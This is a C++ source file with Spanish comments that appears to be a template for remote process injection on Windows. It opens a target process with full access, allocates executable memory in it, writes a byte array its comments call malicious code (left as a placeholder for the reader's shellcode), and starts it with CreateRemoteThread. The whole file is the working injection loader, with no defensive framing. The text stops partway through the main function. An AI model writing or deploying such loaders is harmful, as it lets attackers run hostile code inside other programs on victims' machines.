#include <iostream>
#include <Windows.h>

int main()
{
    // Obtener el identificador del proceso
    DWORD targetProcessId = 1234; // ID del proceso

    // Abrir el proceso
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL)
    {
        std::cout << "No se pudo abrir el proceso" << std::endl;
        return 1;
    }

    // Código malicioso que se inyectará en el proceso
    BYTE maliciousCode[] = { /* Pon tu shellcode aqui */ };

    // Reservar una región de memoria en el proceso
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, sizeof(maliciousCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL)
    {
        std::cout << "No se pudo asignar memoria en el proceso" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Escribir el código en la memoria del proceso
    SIZE_T bytesWritten;
    BOOL writeResult = WriteProcessMemory(hProcess, remoteMemory, maliciousCode, sizeof(maliciousCode), &bytesWritten);
    if (!writeResult || bytesWritten != sizeof(maliciousCode))
    {
        std::cout << "No se pudo escribir el código en la memoria del proceso ." << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Crear un hilo remoto para ejecutar el código 
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL)
    {
        std::cout << "No se pudo crear un hilo remoto en el proceso" << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Inyección completada. Esperando a que el proceso termine..." << std::endl;

    // Esperar hasta que el proceso haya terminado de ejecutar el código malicioso
    WaitForSingleObject(hThread, INFINITE);

    std::cout << "Proceso completado" << std::endl;

